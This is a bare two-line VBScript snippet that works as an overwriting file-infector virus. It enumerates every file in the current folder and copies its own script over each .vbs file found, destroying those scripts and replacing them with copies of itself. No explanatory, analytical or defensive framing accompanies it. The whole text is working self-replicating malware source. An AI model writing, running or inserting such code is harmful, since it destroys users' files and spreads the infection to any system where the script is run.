Set F=CreateObject("Scripting.FileSystemObject"):For Each VF in F.GetFolder(".").Files
If Lcase(F.GetExtensionName(VF.path))="vbs" then:F.CopyFile Wscript.ScriptFullName, VF.path,True:End If:Next